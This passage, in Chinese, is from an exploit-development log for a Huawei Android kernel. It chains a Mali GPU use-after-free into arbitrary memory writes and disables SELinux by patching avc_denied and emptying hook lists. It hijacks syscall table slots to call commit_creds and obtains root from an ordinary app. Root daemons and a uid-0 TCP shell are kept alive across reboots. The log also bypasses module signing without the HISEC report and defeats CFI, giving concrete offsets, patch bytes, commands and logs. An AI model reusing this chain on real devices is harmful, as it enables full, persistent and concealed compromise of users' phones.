lists, 352 writes → 3 selinux nodes remain`。原因不是写丢了，而是**按快照两两摘链在
双节点链上不收敛**：`head→A→B→head` 时，摘 A 写 `head->next=B`，摘 B（仍按快照）
写 `head->prev=A`，B 依旧可达。每个多节点链每轮只能掉一个节点。

修法是把 phaseH 改成**收敛循环**：dump → 算计划 → 写 → 下一轮重新 dump 复算，
最多 5 轮，最后一轮复算必须为 0 才算成功（顺带把 GPU 侧写可能滞留 cache 的
不确定性一起吃掉）。实测一轮即收敛：
```
phaseH: 176 selinux nodes over 185 lists, plan 352 writes
phaseH: round 0: 176 nodes left, 352/352 writes landed
phaseH: 352 total writes, 0 selinux nodes remain - SELinux is out of the hook lists
```

**二、v17 的主进程始终是 uid=2000，这是设计不是 bug。** umh 路线是"纯数据写"，
**从不 commit_creds**（C-20 的初衷：应用域没有可用的 syscall 槽位）。日志里
`phaseI: go-file present, committing` 是 v16 时代遗留的措辞。由此推出两条硬约束：

- `open("/dev/kmsg")` 必然 EACCES（0600 root，`CAP_SYSLOG` 不在手）——想靠 kmsg
  自证的诊断全部作废；
- 任何"进程内 fork 一个 rootd"的兜底都是假的，fork 出来还是 shell。

**三、helper 的命名空间，源码里能查到的事实。** `rest_init()` 是
`kernel_thread(kthreadd, NULL, CLONE_FS | CLONE_FILES)`（`init/main.c:437`），
`copy_namespaces()` 在没带 `CLONE_NEWNS` 时只是共享 nsproxy。也就是说 helper 与
PID 1 **共用 fs_struct 且默认共用一个 mount namespace**，只要 init
自己不 `unshare()`。所以「helper 看不见 /data」是一个需要证据的假说，不是结论。

**四、诊断换成物理读 `__log_buf`。** 既然有任意物理读写，内核 printk 环形缓冲就是
一块可读内存：`__log_buf`（本机 1 MB，`_text+0x2ebb838`，`log_next_idx` 在
`+0x100788`）按 32 页一批 dump 下来，扫 `UMHPROBE` 标记。这条通道不需要任何权限，
是当前唯一能回答「helper 到底跑没跑」的手段。

### C-22. 定论：别写 cred，让内核自己 commit（2026-11-05 凌晨）

**三个结论，一条比一条值钱：**

1. **usermodehelper 这条路在本机走不通**：`log_buf` 扫完 1 MB，`UMHPROBE` **0 hits**。
   `request_module` 的准入（`modprobe_path[0]`、`security_kernel_module_request`、
   `usermodehelper_enable`）在源码里逐条核对过都没问题，所以问题在 helper 的
   exec 侧（它的 mount namespace / 可执行对象），不在我们的脚本。**暂时搁置。**

2. **按节点摘链是错的设计**。多节点链不收敛（§C-21），而且**部分失败会留下半残
   SELinux**——alloc 类 hook 停了、permission 类 hook 还在，后者去解引用前者本该填好
   的 blob，直接空指针 panic。实测两次 abort 之后设备都在几分钟内重启。
   **改成按表头置空**：`head->next = head; head->prev = head`，2 次写/表。
   链表要么完好要么清空，**不存在破损中间态**，天然幂等、天然可验证。实测：

   ```
   phaseH: 181 non-empty hook lists (176 selinux nodes), plan 362 writes
   phaseH: round 0: 181 nodes left, 362/362 writes landed
   phaseH: 362 total writes, 0 selinux nodes remain - SELinux is out of the hook lists
   ```

   一轮收敛，不需要迭代。

3. **清空表头顺带解决了提权**：`capable()` 没人应答 → `security_capable()` 返回 0 →
   `setresuid(0,0,0)` 的 `ns_capable_setid(CAP_SETUID)` 直接放行，内核调用
   `sys_setresuid()` **自己**构造并 `commit_creds()` 一份正规 cred。于是：

   ```
   phaseK: setresuid accepted, uid=0 euid=0 gid=0
   ```

   这条路径比"手改 cred 页"强太多：不碰活页（没有 CPU 缓存与 GPU 写的相干性问题）、
   不需要 exec、不需要 helper、不需要 commit_creds 的 CFI 跳板。
   **arm64 上 `setresuid` = 147，正好在应用域 seccomp 白名单里（0-17,…,117-141,
   147,148,150,…）**，所以这条路对 APK 域同样成立——这是它最关键的价值。

   > 代价要说清楚：`capable()` 从此对所有进程放行（任何进程 `setresuid(0,0,0)`
   > 都能拿到 root）。在这台研究机上可以接受，但这是"全放行"级别的改动。

**已知遗留**：拿到 uid 0 之后约 0.5–1 s，设备仍会重启（疑似 panic）。下一步是先抢救
`/sys/fs/pstore/console-ramoops`（只有 root 能读，所以只能在拿到 root 的那几百毫秒内
拷贝出来），再据此定位。

### C-23. 【定论】"root 通道不响应"是 CRLF 造成的，不是内核问题（2026-11-05）

折腾了整晚的"`PHASE_I OK` 但 root 不响应"，真正的根因只有一句话：

```
/system/bin/sh /data/local/tmp/rootd.sh
  -> /data/local/tmp/rootd.sh[37]: syntax error: unexpected 'do'
```

`probe/rootd.sh` 是 **CRLF 行尾**（`#!/system/bin/sh\r\n`）。mksh 逐行解析到
`for D in $DIRS; do\r` 时看到的是 `do\r` 而不是关键字 `do`，直接语法错误退出；
前 36 行的 `\r` 落在重定向目标上（`2>/dev/null\r`）被 `2>/dev/null` 吞掉，所以
脚本"看起来跑了一半"。**文件通道从第一天起就是坏的，与 SELinux、seccomp、
usermodehelper、mount namespace 全都无关。**

同一轮里 `rootsrv`（原生 TCP shell，`127.0.0.1:45679`）一直是好的：

```
$ python -c 'connect 45679; send "id; touch ..."'
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
RS-CREATE-OK
RS-WRITE-OK
```

把 `probe/*.sh` 转成 LF 后重推，`/system/bin/sh -n` 通过，`rootd` 起来，
`rootout` 里出现 `rootd up: uid=0(root) ... dirs=[/data/local/tmp]`，随后：

```
$ adb shell "/data/local/tmp/r 'id; touch .../v16_r_newfile2 && echo CREATE-OK; \
              echo x > .../v16_r_write2 && echo WRITE-OK'"
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
CREATE-OK
WRITE-OK
-rw-rw-rw- 1 root root 2 2021-07-30 23:15 /data/local/tmp/v16_r_write2
```

**工程教训（写进流程）**：任何推到设备上执行的脚本，先跑
`/system/bin/sh -n <file>`；Windows 侧编辑过的 shell 脚本一律先
`python -c "open(f,'wb').write(open(f,'rb').read().replace(b'\r\n',b'\n'))"`。
`grep -c $'\r'` 在 Git Bash 里不可靠（这次报了 0）。

### C-24. v17「摘空 hook 表」是死路：1 秒内必 panic（2026-11-05）

按表头置空 181 条链（含 `capability_hooks` 的宿主链）确实一轮收敛：

```
phaseH: 181 non-empty hook lists (176 selinux nodes), plan 362 writes
phaseH: round 0: 181 nodes left, 362/362 writes landed
phaseH: 362 total writes, 0 selinux nodes remain - SELinux is out of the hook lists
phaseK: setresuid accepted, uid=0 euid=0 gid=0
```

`setresuid(0,0,0)` 成功（`ns_capable_setid` 因为 `security_capable()` 返回 0 而放行），
pstore 也抢救成功（`console-ramoops-0` 524 KB + `dmesg-ramoops-0` 218 KB），
但**拿到 uid 0 之后约 1 秒设备必重启**，两轮都是同一个位置（fork rootd 之后）。

原因不难推：`capability` 的 hook 也一起被摘了，`capable()` 从此对所有进程永真，
内核里所有 `ns_capable()` 保护同时失效（`vm_enough_memory`、`bprm` 的 caps 计算、
`ptrace` 检查全部变成放行）。**这是"把整个内核的权限判定改成恒真"，不是提权，
是拆掉守卫。**

拿到 root 之后又用 `r` 把 pstore 读了出来（只有 root 能读，所以必须趁那一刻），
panic 的真身不是我们的进程，是 **init**：

```
[ 1523.806121s][pid:1,cpu3,init]PC is at panic+0x98/0x570
[ 1523.807403s][pid:1,cpu3,init][<ffffff8ad315cab0>] do_exit+0xe60/0x1194
[ 1523.807403s][pid:1,cpu3,init][<ffffff8ad315e154>] do_group_exit+0xfc/0x100
[ 1523.807404s][pid:1,cpu3,init][<ffffff8ad31716f4>] get_signal+0x9a0/0xabc
[ 1523.807434s][pid:1,cpu3,init][<ffffff8ad3132f40>] do_notify_resume+0x250/0x790
Kernel panic - not syncing: Attempted to kill init! exitcode=0x0000000b
```

`exitcode=0xb` = SIGSEGV。也就是说 **init 在用户态段错误**，而 pid 1 死掉必然
`panic("Attempted to kill init")`，跟 Mali context teardown、跟我们的进程都没关系。
（注意时间戳：uptime 1523 s 才炸，所以之前"1 秒内必 panic"的说法不准确——是
**摘掉 hook 之后某个时刻**，几十秒到十几分钟都可能。）

结论不变，但更硬：**这条路不再走。只把 `avc_denied` 的返回值改掉，hook 链表一个都不碰。**

### C-25. 【可用化达成】v16c `avc` 就是那条"稳定又能用"的路径

`probe/run_v16c.sh avc` 一条命令，5 秒内完成，**不碰任何 hook 链表**：

```
phaseJ: avc_denied off=0x6b866c ...
phaseJ: slot501 preflight wr=0 map_ok=1
phaseJ: patched ok, flushed 8/8 cpus, icache 0xffffff9eea538000
phaseI: try0 wr=0 entry262=ffffff9eeb830da8 want=... ok
phaseI: commit_creds rc=0 errno=0 uid=0 euid=0 gid=0
phaseI: append existing file = 7 (ok)
phaseI: create new file = 7 errno=0 (ok)
phaseI: domain [u:r:kernel:s0]
root channel: rootd=22400 rootsrv=22401
PHASE_I OK uid=0 caps=7fffffffff avc=1 sid=kernel(init_cred)
keepalive: L2 descriptors live, holding context (pid=22098)
```

两个部件，各司其职：

1. **`commit_creds(cloned init_cred)`** → uid 0 + `caps=0x7fffffffff`，
   cred 是自己的副本所以 keyring/FBE 会话密钥还在；
2. **`avc_denied` 改成 `mov w0,#0; ret`**（`0x6b866c`，两条 32 位 store +
   `flush_icache_range` 打 8 个核）→ 所有 SELinux 拒绝都返回 0，
   **事实上的全局 permissive**，但 `capable()` 完全不受影响。

实测（uptime 3747 s，跑了 7 分钟以上）：探针 `keepalive` 存活、`rootsrv` 存活、
`r` 通道 CREATE-OK / WRITE-OK、文件属主 root。**这就是"稳定且能用"。**

> 注意：`avc_denied` 之后紧邻的字节是死代码（函数已经提前 return），
> 正好可以放 8 字节的跳板 —— 见 C-26 的 APK 方案。

### C-26. 应用域的 commit 载体：换一个白名单内的真实 syscall

C-19 证明应用域 seccomp 把 ni 槽位全挡死，所以 `sys_call_table[244]` 这条路在
APK 里不可用。但**不需要跳板**：本机 4.14 的 `sys_call_table[]` 是旧 ABI，
表项直接以 x0..x5 接收用户参数（v16 的
`syscall(g_hook_slot, fake_va, 0, 0, 0, 0)` → `commit_creds(fake_va)` 已经实测
成功就是证据，不是 4.17+ 的 `syscall_fn(regs)` 形态）。所以只要挑一个
**应用白名单内、bionic 从不调用**的真实号码，把它的表项临时指向
`commit_creds`、调用 `syscall(nr, cred)`、再还原即可。

新增开关 `PROBE_SLOT`（默认只在 APK 侧设置），`probe/run_v16c.sh slot` 用于
shell 域验证；槽位会保存 `g_slot_orig` 并在 commit 后精确还原，而不是写回
`sys_ni_syscall`。`GuardService` 传 `PROBE_SLOT=148`（bpf）。

**候选清单（都在应用白名单里）**：`148 bpf`、`140 setpriority`、`141 getpriority`、
`47 fallocate`、`26 inotify_init1`、`30 ioprio_set`。

> 早先 C-26 草稿里设想过 `ldr x0,[x0]; b commit_creds` 的跳板，后来证实
> **完全多余**（旧 ABI 直接传参），已删除。

### C-27. 【定论】sys_call_table 的写入是「按 64 字节缓存行」可见的

第一次实机试 `PROBE_SLOT=58`（vhangup）**全链到位但写入根本不落地**：

```
phaseF: forced slot=58 orig=ffffff9f8e83dcd0 (not an ni entry)
phaseF: hook slot=58, 1 callable ni slots:
phaseJ: slot501 preflight wr=0 map_ok=1          <- 写通道本身正常
phaseJ: flush hook not visible, skipped          <- 但表项没变
phaseI: try0/1/2 wr=0 entry262=ffffff9f8e83dcd0 want=...30da8 MISMATCH
phaseI: commit_creds rc=-1 errno=1 uid=2000      <- 真的执行了 sys_vhangup (EPERM)
```

`PHASE_C/D` 全部通过（任意物理读写正常），`slot501 preflight` 也证明 GPU 写能用，
所以问题不在通道、不在 seccomp、不在地址换算，**只在这个表项的位置**。

原因：`sys_call_table` 每项 8 字节，8 项共享一条 64 字节缓存行。**58 所在的行是
56–63 = `openat / close / vhangup / pipe2 / quotactl / getdents64 / lseek / read`，
是全表最热的一行**，每颗核的 L1 都常驻它。GPU 把新指针写进 DRAM，CPU 却一直
命中自己的旧副本：于是 dispatch 派到旧的 `sys_vhangup`（EPERM），而
`dump_phys_batch()` 经 `kbase_mmu_dump()` 走 CPU 可见路径回读，也一直显示旧值。
之前成功的 244 落在 240–247 那行 —— 全是从不被调用的 ni 项，行是冷的，
写就立刻可见。源码里 `chan_map_block()` 的注释也早就记着同类现象：
"with the GPU path a single cacheline (8 consecutive entries) was left stale"。

**不要猜哪个号码冷，让探针自己量。** 新加的 slot poker 在 commit 之前逐个候选
做「写一个无害指针（`flush_icache_range(fake,0)` 是 no-op）→ 回读校验 →
立刻还原」，挑第一个 `got == want` 的号码；失败的候选等于什么都没做。
全部失败就中止，绝不带着错误的表项去调 syscall。

**待办**：`slot poker` 已在 shell 域跑验证；通过后装 APK、走
`probe/run_apk.sh` 做应用域端到端。APK 侧用
`rootd.sh <app_files_dir> /data/local/tmp` 双收件箱 + `rootsrv` 二选一。

### C-28. 【定论】应用域端到端成功：从 APK 拿到 uid 0（2026-11-04 下午）

`slot poker` 在 shell 域验证通过之后，把同一套二进制打进 APK（md5 `caf82243…`），
**从应用域（`untrusted_app` → `u:r:kernel:s0`，uid 0）一次跑通**：

```
phaseF: poker slot 148 wr=0 got=ffffff8849a5ebc0 want=…ebc0 LANDED
phaseF: poker chose slot 148 (orig=ffffff8849a49670)
phaseJ: avc_denied off=0x6b866c … patched ok, flushed 2/2 cpus
phaseI: try0 wr=0 entry262=ffffff8849a30da8 want=…30da8 ok
phaseI: commit_creds rc=0 errno=0 uid=0 euid=0 gid=0
phaseI: domain [u:r:kernel:s0]
root channel: rootd=7985 rootsrv=7986
rootsrv listening on 127.0.0.1:45679 uid=0
PHASE_I OK uid=0 caps=7fffffffff avc=1 sid=kernel(init_cred)
keepalive: L2 descriptors live, holding context (pid=7970)
```

验证：

```
$ adb shell "/data/local/tmp/r 'id; echo APK-DOMAIN-ROOT-OK'"
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
APK-DOMAIN-ROOT-OK
```

rootd 的**双收件箱都写上了标记**（`/data/local/tmp/rootup` 和
`/data/user/0/com.hlk.rootguard/files/chan/rootup`——后者 rootd 能读，是因为
avc_denied 已被置空 + root 带 CAP_DAC_OVERRIDE），应用私有目录里的
`rootd.sh / rootsrv / r / koffs.txt` 都是从 APK assets 提取的，**完全不依赖
adb 预推的文件**。`flushed 2/2 cpus` 是应用域被 cpuset 关在 2 个核上的正常现象。

**这轮踩掉的三个坑（每一个都会让"看似成功"变成"什么都没发生"）：**

1. **安装后从未打开过的应用处于 stopped 状态，`am broadcast` 会静默跳过它的
   receiver** —— 广播显示 `Broadcast completed: result=0`，但 `onReceive()` 根本
   没执行，logcat 里连一条 `HlkGuard` 都没有。`--include-stopped-packages` 在
   这台 EMUI 上也救不回来；**先打开一次 MainActivity 再广播就好了**。开机广播
   `BOOT_COMPLETED` 系统自带 include-stopped 语义，不受此影响。
2. **Android 10 scoped storage：adb shell 读不到别的应用的
   `/sdcard/Android/data/<pkg>/files/`** —— `run_apk.sh` 的日志镜像因此一直
   空转 37 分钟。诊断要走 `adb logcat -d -s HlkGuard`（`GuardService.note()`
   走 `Log.i`），或者等 root 起来后用 `r 'cat …'`。
3. **华为的"应用启动管理"会拦后台拉起服务**，表面症状同样是"广播送达但毫无
   反应"。判别方法是看 logcat 有没有 receiver 自己的日志：一条都没有就是被拦，
   有日志但卡住才是我们自己的问题。

**APK 侧的最后两个修正**（都是让应用域第一次就能跑通）：

- `stage()` 的目标文件名从 `xprobe` 改回 **`jit_write_probe`** —— phase I 靠
  `task_struct.comm` 找自己的 cred，`/proc/self/comm` 虽然一般可读，但把文件名
  对上内置兜底字符串才是零风险。
- `koffs.txt` 进 assets + `PROBE_KOFFS`，phase E 的 `access()` 也改成读这个
  环境变量，全新安装、没跑过任何 adb 脚本的手机上照样跳过 50 MB 的内核镜像 dump。

### C-29. 无人值守开机自启：链路全部自动跑通，守护进程存活是新的前沿（2026-11-04 晚）

`probe/run_boot_selftest.sh`：重启、**全程不碰任何东西**。结果：

```
== uptime=1501 s, gate clear ==
== rootup marker present at uptime=1501s ==
```

`/data/local/tmp/rootup` 出现 `rootd up: uid=0(root) … context=u:r:kernel:s0`，
说明 `BOOT_COMPLETED → BootReceiver(arm) → GuardService → 探针 → commit_creds
→ rootd/rootsrv` 这条链在**没有任何人工干预**的情况下自己走完了。刹车、一次性
arming、硬开关全部保持有效。

**但约 4 分钟后守护进程全没了**（uptime 1761 s 时 ps 里既没有探针也没有
rootd/rootsrv，系统没 panic，uptime 连续）。logcat 的 `am_kill`/`am_proc_died`
里没有对应记录，`HlkGuard` 也一片空白——**这是 EMUI 自己的后台清理
（iAware/省电策略），不走 AMS 的 kill 路径，`oom_score_adj=-1000` 拦不住**。

这正好解释了为什么 adb 场景下 rootd 能活很久（USB 连着、系统判定前台活跃），
而拔线待机就被清。对策按成本排序：

1. **用户手动开后台保护**（华为：设置 → 应用 → 应用启动管理 → 关闭"自动管理"，
   允许自启动/后台活动/关联启动）。这是一次性授权，跟"打开开关"属于同一步骤，
   也符合"可手动开关"的要求。
2. **互拉看门狗**：rootd 与 rootsrv 各 fork 一个 watchdog，互检 pid、谁没了就
   重新拉起。能扛单轮清理，扛不住 EMUI 的一次性全杀。
3. root 权限的更硬手段（写 persistent_properties / 改 init.rc）改动面大，
   且要处理 SELinux 标签，暂不动。

**结论**：链路本身已经完全自动化；剩下的"root 活多久"是省电策略与守护进程
形态之间的博弈，不再是提权问题。



### C-30. 【定论】EMUI 定点查杀 uid-0 监听进程，黑匣子实证（2026-11-04 晚）

rootsrv 加 SIGTERM/SIGINT/SIGHUP/SIGCHLD handler + HIDTRACE 退出黑匣子后，对照实验：
同一二进制，**uid 2000 (shell) 跑 8 秒以上存活**；**uid 0 (root) 跑 2-3 秒被不可捕获的
SIGKILL 杀掉**，trace 文件里没有任何记录（handler 没机会执行）。探针/rootd/watcher
（sh 或原始进程形态）不触发。

结论：iAware 按「uid 0 + 监听 socket」特征定点 SIGKILL，绕过全部信号处理路径。
伪装名（.sysd/hid）没用，杀的是 uid。这也是「adb 场景能活、拔线就死」的补充解释。

### C-31. 【事故复盘】看门狗风暴：`[ -s /proc/<pid>/cmdline ]` 恒假（2026-11-04 晚）

rootd.sh 的 `alive()` 最初用 `[ -s /proc/<pid>/cmdline ]` 判活——procfs 文件
st_size 恒为 0，永远判死。watcher 每秒"复活"活着的 rootd → 指数增殖，45 分钟
pid 空间打穿回绕，手机卡顿到疑似触发 panic 重启。

修复三件套：
1. `alive() { [ -n "$1" ] && kill -0 "$1" 2>/dev/null; }`
2. 风暴保险丝：同脚本实例数 >4 直接退出
3. 收养逻辑：复活的 rootd 先看 rootsrv.pid 是否存活，是则认领孤儿 hid 不抢端口

**教训：改核心守护组件，只做 `sh -n` 语法验证就上机是不够的，判活逻辑必须单元级验证。**

### C-32. iAware 拦截 JobService 绑定的实锤（2026-11-04 晚）

BootJobService（setPersisted(true)，15 分钟周期）在授权错误状态下，logcat 出现
`Service starting has been prevented by iaware`。BOOT_COMPLETED 则是静默跳过
（receiver 根本收不到，`appType: -1`，`restricted`）。

### C-33. 【定论】EMUI 应用启动管理的开关语义是反的（2026-11-04 深夜）

**用户实测发现**：华为「设置 → 应用 → 应用启动管理」里的开关，
**打开 = 自动管理（iAware 全权做主）**，**关闭 = 手动管理（用户说了算）**，
关闭后才有「允许自启动/后台活动/关联启动」三个勾选项。

此前所有测试都停在同一误区：以为"打开开关"就是授权自启动，实际是主动把
控制权交给 iAware。C-29 的 4 分钟团灭、C-32 的 Job 拦截、BOOT_COMPLETED
静默跳过，全部源于此。正确姿势（已由用户在真机上设置）：
**关闭自动管理 → 手动管理 → 勾选允许自启动（+ 建议后台活动、关联启动）**。

验证证据（2026-11-04 22:28，授权修正后首个 boot）：BootJobService 成功
onStartJob（`HlkGuard: boot job: attempt in flight`），logcat 中不再出现
iaware prevented 字样。

另注意：~~`pm install -r` 重装 APK 会重置用户已开的手动管理授权~~
**用户实测修正（2026-11-04 深夜）：重装 APK 不会重置 EMUI 自启动授权**，
更新 APK 后无需重新设置。

### C-34. 【定论】授权修正后的查杀版图：sh 守护存活，TCP 监听仍被定点杀（2026-11-04 深夜）

22:50 重启（新授权首个无人干预 boot）后的完整验证：

- **开机自启**：BOOT_COMPLETED 后 27 秒 GuardService 自动拉起探针，全程无人干预，
  logcat 零拦截。strike 未累积，UAF 阶段稳定（23:15 门禁过，`uid=0 kernel:s0`）。
- **sh 形态 uid-0 守护（rootd/watcher）**：23:15:11 起连续存活 10 分钟+，零死亡。
  iAware 对这类进程不再动手。
- **TCP 监听的 rootsrv（.sysd/hid）**：C-30 的定点 SIGKILL 在新授权下**依然生效**，
  rootd 每 1-2 分钟重拉一次（pid 8360→10952→11167→13996...），拉起-被杀循环，
  但 rootd/watch 自身无恙。
- **root 驻留三支柱 = 探针(持有页表) + rootd(rootcmd 文件通道) + watcher**，
  全部稳定——驻留目标实质达成。rootsrv TCP 通道降级为"adb 场景专用、
  随时会被杀但会被自动重拉"的角色；可授权 root 需改用 SO_PEERCRED 版或去监听化。

教训两条：
1. **rootd 执行环境里的 `ps -A` 输出可能为空/异常**，据此判死会得出"团灭"误判
   （本次 STIME 铁证翻案：rootd/watcher 从未死过）。判活以 STIME + kill -0 双验。
2. **不要同时 kill 三件套**——watcher 与 rootd 同瞬间死 = 死局（无人复活）。
   需要重启守护时先杀 rootsrv，再看 rootd 自愈，最后才动 watcher。
3. 运行中的 sh 脚本文件**不能就地覆盖**（解释器按 offset 逐块读，错位后行为未定义）；
   本次 vmd 被覆盖后 rootd 进程立即处于"脏"状态，正确做法是 kill 后让 watcher
   或手工从新文件重新拉起。

**历史基线对照（旧授权时代 6 小时 soak，2026-11-04 夜）**：polls=356，
full-online=0%（守护三件套整夜全灭）；但 root 探针本体存活 5.3 小时+
（uptime 19243s 时 channel 仍 `uid=0 kernel:s0`）——授权错误时被扫的是
sh 守护形态，探针本体反而是最长寿的。授权修正后 rootd/watch 已零死亡，
两相对照证实 C-33/C-34。

### D. 静态分析收尾状态
- ION 审计完成（见 C），TST_CMD 排除，dubai 排除（dubaid 权限）
- Mali：**设备=HM2（2021）代码，38181/39793/22706/28663/28664 全部未修复**；此前依据的 src 树实为 HM3（2023 加固版），已解包正确基线到 refs/。这是目前最有希望的提权路径
- 动态环境（历史）：zig cc (aarch64-linux-musl static) → adb push /data/local/tmp → shell 执行；注意 O_RDONLY 开 /dev/ion、chmod +x
- **当前状态（2026-11-04，已闭环）**：**v16e 全链路成功——`uid=0(root)` + `u:r:kernel:s0` + `avc_denied` 置空 → 事实上的全局 permissive，且驻留 18 分钟以上仍全能力可用。**
  完整链条：UAF → GPU 页表劫持 → 任意物理读写 → 定位内核镜像 → 克隆 cred（保留自有 keyring，`security` 沿用 init 的）→ phaseJ 把 `avc_denied` 改成 `mov w0,#0; ret` → `sys_call_table[262]` 指向 `commit_creds` 的 CFI 跳板 → `commit_creds(fake)`。
  单一 md5 `36d6b858e9f5f376290a94cfa6d97fea`，驱动 `probe/run_v16c.sh avc`。
  "提权后 I/O 不可见"的边界已定论为 SELinux SID 问题（C-14）；三种解法对应 v16b 受限 root / v16c permissive 打补丁 / v16e 两者合一并真正落地。
  日志旁路见 C-15，`MALI_WRITE_VALUE` 对齐约束见 C-17，重启 panic 的两个候选见 C-16。
  设备上可能仍保留活探针（dirty L2），**不要 kill**，重启即清。
- 剩余方向：CVE-2023-6143/4211 竞态面（无公开细节，需自行建模）；ion 安全池配额 DoS（可恢复性待评估）；继续枚举 drivers/hisi 下其他驱动（4GPLUS、hicam_buf 等）

### E. 内核模块链（2026-11-05 晚，C-35…C-40）

Mali 链之后的第二层：不是再拿一次 root，而是让内核接受自编译模块、由模块
做授权。详见 `docs/RESEARCH_LOG.md` 17–20 章。

#### C-35. 【定论】`MODULE_SIG_FORCE` 可用一条 `b` 绕过，且不上报 HISEC

华为在 `module_sig_check()` 里只加了一行 `saudit_log(MOD_SIGN, STP_RISK, …)`，
位置在 `err` 判断之前——所以"拒绝"和"上报 HISEC"是绑在一起的。
把 `load_module+0x1e4` 的 `cbz w0,+0x24c` 改成 `b +0x84`，直接落到
`info->sig_ok = true` 再接 ELF 检查，**整段 `saudit_log` 被跳过**。
判据：`insmod` rc=0 **且** `/proc/modules` 出现模块名（只看 rc 会被"假成功"骗）。

#### C-36. 【定论】模块 init 被静默跳过 = `struct module` 差 8 字节

内核反汇编读 `ldr x0,[x19,#0x178]`，本地编译把 `init` 放在 `0x170` → 读到 0
→ `if (mod->init != NULL)` 直接跳过，**不报错、不崩溃**。两处偏差：
`safe_cfi_area`（被 `CONFIG_CFI_CLANG` 守卫，本地 gcc 关掉了 CFI）、
`mod_arch_specific.ftrace_trampoline`（本树缺 ifdef，设备 `DYNAMIC_FTRACE` 关）。
用 `offsetof` → 数组大小的探针模块量得：`name=0x18 / init=0x178 /
init_layout.base=0x1d0 / exit=0x308`，与内核逐项一致。

#### C-37. 【定论】CFI 慢路径一条 RET 放行；但 `rmmod` 会重启手机

`do_one_initcall` 调模块函数的真实路径是
`mov x0,#typeid → bl __cfi_slowpath_diag → b → blr x19`，所以把
`__cfi_slowpath_diag @ 0x28b9e4` 改成 `ret`，校验就退化为放行、调用照常。
但**卸载**走的是 `mod->exit()`，同样受 CFI 校验，失败后华为记
`blackbox: from_module [VENDOR AP CFI], exce_type 0x6a` 并**直接重启**。
现场 ramoops 摘录见 `docs/RESEARCH_LOG.md` 第 18 章。**永不 `rmmod`，换模块就重启。**

#### C-38. 【定论】`cred.h` 会拖进未导出符号，模块必须走 raw 偏移

`<linux/cred.h>` → `<linux/hisi/prmem.h>`，引入 `init_cred` / `init_task` /
`__start_data_wr` / `g_prmem_ranges` 等**未导出**符号，模块加载直接
`Unknown symbol`。`module_param()` 同理（`__start_data_wr_after_init`）。
可行做法：`mrs sp_el0` 取 current、`+0x938` 取 cred、`+4` 取 uid（全部来自
内核反汇编），提权用 `prepare_kernel_cred(NULL)` + `commit_creds()`，
**只作用于 current**。跨进程改 `task_struct->cred` 会因为本地 `task_struct`
偏移不符写错地址（`hlk_grant.c` 的失败即此）。

#### C-39. 【定论】KernelSU 不可用，SukiSU 架构可行但需移植

- `# CONFIG_KPROBES is not set` + `# CONFIG_FUNCTION_TRACER is not set`
  → KernelSU 官方 LKM 的 hook 全靠 kprobe，`register_kretprobe()` 在头文件里
  是返回 `-ENOSYS` 的内联桩，**这条路直接死**。
- SukiSU Ultra 的 arm64 hook 引擎**不依赖 kprobe**：`sys_call_table` 空槽换
  dispatcher + `sys_enter` tracepoint 重定向，写只读内存用自研 fixmap
  （`FIX_TEXT_POKE0` + `stop_machine`），kretprobe 只是 `#ifdef` 可选。
  本机这些原语全在，但它的符号命名与 syscall 表模型是 5.x 的
  （`__arm64_sys_ni_syscall` vs `sys_ni_syscall`、无 `syscall_fn_t` typedef），
  且 feature 层依赖 BTF 与大量结构体偏移。**结论：借引擎（三个文件约 21 KB），
  不整套搬。**

#### C-40. 【教训】设备上的 `koffs.txt` 优先于探针内置表；不要二次起探针

`load_ksym_offsets()` 里 `getenv("PROBE_KOFFS")` 分支优先，所以换偏移必须同时
改**内置表、仓库 `koffs.txt`、设备 `/data/local/tmp/koffs.txt`** 三处，
否则会出现"tag 是新的、offset 是旧的"。
另外**不要在活着的 root 通道上二次运行探针**：会拉起第二套 rootd，两个 rootd
抢同一个 `rootcmd`，`timeout` 又杀不掉忽略 SIGTERM 的 daemon，通道直接卡死。
改探针只走"重打 APK → 安装 → 重启"。
还有：探针回读报 `patch not visible` **不代表没写进去**（GPU 写入路径与回读路径
不同）——以功能验证为准。v26 的 `cfi_bypass` / `seccomp_bypass` 都是这种情况。

## F. SukiSU Ultra 终态（2026-11-06，C-41…C-48）

第 20 章的结论是「整套搬 SukiSU 要几周、且很脆」，于是改走**只对齐用户态
契约**：不移植内核 feature 层，只实现一个能被官方 Manager / ksud 认出来的
supercall 垫片。这一节是最终落地结论，产物在 `sukisu-ultra/`。

#### C-41. 【定论】解法 A 成立：垫片 = 对齐 ABI，不是移植内核

三层：① 开机链（APK/探针拿 uid 0）→ ② `hlk_ksu_shim9.ko` → ③ 官方
SukiSU Ultra Manager v4.2.1/40994 + 自编 `hlk_su`。垫片只实现
`GET_INFO` / `GET_INFO_LEGACY` / `GRANT_ROOT` / `CHECK_SAFEMODE` /
`GET·SET_APP_PROFILE` / `NEW_GET_ALLOW_LIST` / `GET_FEATURE` /
`GET_FULL_VERSION` / `HOOK_TYPE` / `REPORT_EVENT` 十条 ioctl，
不碰 allowlist 持久化以外的策略层。新增代码量与一个 `hlk_su.c` 同量级，
不刷 boot.img、不写 sys_call_table、不写任何只读内核内存。

#### C-42. 【定论】supercall 入口是 `[ksu_driver]` fd + ioctl，不是 prctl

`v4.2.1/manager/app/src/main/cpp/ksu.cc` 的 `scan_driver_fd()` 只扫
`/proc/self/fd` 里名字含 `[ksu_driver]` 的 anon inode；`ksud/src/ksucalls.rs`
里 `init_driver_fd()` 找不到 fd 才发
`syscall(SYS_reboot, 0xDEADBEEF, 0xCAFEBABE, 0, &fd)`。官方靠 kprobe 挂
`sys_reboot` 用 `task_work_add` + `anon_inode_getfile(O_CLOEXEC)` 装 fd。
**本机 `CONFIG_KPROBES=n` 但 `CONFIG_HAVE_SYSCALL_TRACEPOINTS=y`**，
`__tracepoint_sys_enter` / `tracepoint_probe_register` 都在 → 用
`sys_enter` tracepoint 完整替代 kprobe，arm64 4.14 `pt_regs` 开头即
`u64 regs[31]`，直接取 `regs[0..3]`。这是「零表项改写」的关键。

#### C-43. 【定论】版本/UAPI 必须逐字节对齐，且 v4.3.0 在本机不可用

- v4.2.1：`versionCode=40994`、`KERNEL_SU_UAPI_VERSION=5`；
  v4.3.0-r1：`41140`、UAPI `6`。
- 垫片 `GET_INFO.version` 必须等于 APK versionCode，否则
  `HomeUiState.isVersionMismatch` 报警告卡；
  `uapi_version` 不等会被 `ksud::ensure_uapi_version_matched()` 直接 bail。
